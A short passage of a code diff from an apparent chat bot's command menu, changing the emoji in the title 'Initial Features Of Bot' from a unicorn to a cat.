             case 'command': {
 	const sections = [{
-								"title": "Initial Features Of Bot 🦄",
+								"title": "Initial Features Of Bot 🐱",
 								"rows": [
 									{
 										"title": "Other ☕",
